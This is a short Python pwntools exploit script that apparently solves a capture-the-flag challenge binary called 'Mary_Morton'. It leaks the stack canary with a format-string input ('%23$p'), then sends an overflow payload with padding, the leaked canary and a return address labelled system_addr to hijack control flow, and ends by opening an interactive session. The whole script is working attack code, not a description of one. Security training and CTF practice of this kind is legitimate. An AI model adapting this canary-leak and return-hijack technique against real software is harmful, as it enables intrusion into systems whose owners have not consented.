#!/usr/bin/env python
from pwn import *
from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./Mary_Morton"
# libc_binary = "./"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
# libc = ELF(libc_binary)
p.sendlineafter("3. Exit the battle \n","2")
p.sendline("%23$p")
canary = int(p.recvline().strip(),16)
log.success(canary)

p.sendline("1")
# p.recvuntil("3. Exit the battle \n")

system_addr = 0x4008da
context.arch= "amd64"
payload = flat([
    "a"*0x88,p64(canary),0xdeadbeef,p64(system_addr)
])
p.sendline(payload)


p.interactive()
